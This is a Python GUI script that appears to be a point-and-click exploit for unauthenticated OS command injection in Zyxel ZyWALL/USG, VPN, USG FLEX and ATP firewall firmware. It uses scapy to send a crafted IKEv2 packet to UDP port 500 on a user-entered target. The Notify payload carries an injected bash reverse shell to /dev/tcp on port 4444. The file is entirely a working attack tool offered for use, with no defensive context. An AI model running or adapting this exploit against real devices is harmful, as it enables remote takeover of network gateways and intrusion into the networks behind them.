#!/usr/bin/python3
import sys
from scapy.all import *
import argparse
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
import requests

root = tkinter.Tk()
root.title("CVE_2023_0861 exploits")
root.geometry('600x400+0+0')
def printInput():
    inp = inputtxt.get(1.0, "end-1c")
    lbl.config(text = "attack url : "+inp)
    
    scroll_y = Scrollbar(root, orient=VERTICAL)
    txtarea = Text(root, yscrollcommand=scroll_y.set, font=(
            "times new roman", 15, "bold"), fg="#3206b8")
    scroll_y.pack(side=RIGHT, fill=Y)
    scroll_y.config(command=txtarea.yview)
    txtarea.pack(fill=BOTH, expand=1)

    rhost = inp
    lhost = '0.0.0.0'
    lport = '4444'

    load_contrib('ikev2')

    cmd = "\";bash -c \"exec bash -i &>/dev/tcp/" + lhost + "/" + lport + " <&1;\";echo -n \""


    packet = IP(dst = rhost) / UDP(dport = 500) / IKEv2(init_SPI = RandString(8), next_payload = 'Notify', exch_type = 'IKE_SA_INIT', flags='Initiator') / IKEv2_payload_Notify(next_payload = 'Nonce', type = 14, load = "HAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXB" + cmd) / IKEv2_payload_Nonce(next_payload = 'None', load = RandString(68))

    send(packet)
    txtarea.insert(END, packet)
Hacher = Label(root, text="Improper error message handling in Zyxel ZyWALL/USG series firmware versions 4.60 through 4.73,\n VPN series firmware versions 4.60 through 5.35, USG FLEX series firmware versions 4.60 through 5.35,\n and ATP series firmware versions 4.60 through 5.35, which could allow an unauthenticated attacker\n to execute some OS commands remotely by sending crafted packets to an affected device.").pack()  
Hacher = Label(root, text="Enter domin www.example.com : ").pack()
inputtxt = tk.Text(root,height = 1,width = 80)
inputtxt.pack()
printButton = tk.Button(root,text = "exploit", command = printInput)
printButton.pack()
lbl = tk.Label(root, text = "")
lbl.pack()
root.mainloop()